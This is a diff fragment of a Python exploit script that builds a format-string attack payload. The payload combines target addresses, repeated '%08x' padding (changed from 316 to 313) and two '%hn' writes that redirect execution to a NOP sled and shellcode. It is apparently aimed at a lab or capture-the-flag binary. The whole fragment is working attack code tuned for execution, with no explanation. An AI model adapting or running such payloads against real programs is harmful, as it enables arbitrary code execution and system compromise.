@@ -30,7 +30,7 @@ ADDRESSTOWRITE2 = ADDRESSTOWRITE2.to_bytes(4, 'little')
 ADDRESSOFSTRING = b'7EFFE9C0'
 ADDRESSOFSHELLCODE = int(ADDRESSOFSTRING, 16) + 0x43
 ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(4, 'little'))
-LENTGHOFREQUIRED = 316
+LENTGHOFREQUIRED = 313
 
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' +  b'%hn' + NOPSLED + SHELLCODE + b'\n')
+    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*313 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' +  b'%hn' + NOPSLED + SHELLCODE + b'\n')
